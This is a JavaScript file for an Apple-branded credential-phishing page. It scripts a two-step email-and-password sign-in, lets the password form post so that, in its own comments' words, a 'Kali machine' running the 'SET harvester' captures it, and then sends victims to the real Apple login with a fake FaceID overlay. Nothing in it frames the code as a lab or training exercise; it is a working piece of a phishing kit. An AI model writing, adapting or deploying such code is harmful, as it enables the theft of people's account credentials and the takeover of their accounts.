const startBtn = document.getElementById('start-signin');
const logoCont = document.getElementById('logo-container');
const landingSec = document.getElementById('landing-section');
const loginSec = document.getElementById('login-section');
const mainBtn = document.getElementById('mainBtn');
const passSec = document.getElementById('password-section');
const passkeyBtn = document.getElementById('passkeyBtn');
const faceidOverlay = document.getElementById('faceid-overlay');
const topNav = document.querySelector('.top-nav');

let loginStep = 'email';

// 1. Landing to Login Transition
startBtn.addEventListener('click', () => {
    logoCont.classList.replace('logo-hero', 'logo-small');
    landingSec.classList.add('hidden');
    topNav.classList.remove('hidden');
    
    setTimeout(() => {
        loginSec.classList.remove('hidden');
        loginSec.style.opacity = '1';
    }, 400);
});

// 2. Email to Password Drop-down & Harvester Trigger
document.getElementById('loginForm').addEventListener('submit', (e) => {
    if (loginStep === 'email') {
        // Step 1: Prevent submission so we can show the password field
        e.preventDefault(); 
        passSec.classList.add('field-expanded');
        mainBtn.textContent = 'Sign In';
        document.getElementById('password').focus();
        loginStep = 'password';
    } else {
        // Step 2: The user has entered their password.
        // We do NOT call e.preventDefault() here.
        // This allows the POST request to fire so your Kali machine captures it.
        mainBtn.textContent = 'Signing in...';
        
        // Note: The browser will now redirect based on the form's 'action' 
        // which the SET harvester will automatically handle for you.
    }
});

// 3. FaceID Simulation
passkeyBtn.addEventListener('click', () => {
    faceidOverlay.classList.remove('faceid-hidden');
    setTimeout(() => {
        // Redirecting to a generic landing page after the 'harvest'
        window.location.href = "https://idmsa.apple.com"; 
    }, 2500);
});
